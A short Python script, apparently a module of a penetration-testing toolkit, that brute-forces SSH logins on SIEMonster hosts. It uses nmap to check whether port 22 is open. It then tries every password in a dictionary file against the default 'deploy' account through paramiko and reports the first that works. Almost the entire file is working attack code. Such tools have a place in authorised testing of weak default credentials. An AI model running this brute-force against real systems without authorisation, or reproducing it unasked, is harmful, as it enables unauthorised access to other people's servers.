#!/usr/bin/env python3

# SIEMonster SSH Bruteforce

# %%%%%%%%%%% Libraries %%%%%%%%%%%#


import os
import nmap
import globals
import logging
import paramiko

# %%%%%%%%%% Functions %%%%%%%%%#


def smonster_ssh_bf(ip):
    __location__ = os.path.realpath(
        os.path.join(os.getcwd(), os.path.dirname(__file__)))
    file = open(os.path.join(__location__, 'dict.txt'))
    nm = nmap.PortScanner()
    bps = 0

    try:
        nm.scan(hosts=ip, arguments='-sT -T4 -p 22')
        if nm[ip]['tcp'][22]['state'] == 'open':
            for line in file:
                password = line.strip('\n\r')
                if ssh_credentials(ip, password):
                    mess = ['deploy', password]
                    globals.messages(7)
                    globals.messages(9, mess)
                    file.close()
                    bps = 1
                    break
            if bps == 0:
                globals.messages(8)
                file.close()
        else:
            globals.messages(8)
            file.close()

    except Exception as e:
        globals.messages(8)
        file.close()
        logging.error(e, exc_info=True)


def ssh_credentials(ip, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, username='deploy', password=password,
                    banner_timeout=2000)
        return True
    except paramiko.AuthenticationException:
        return False
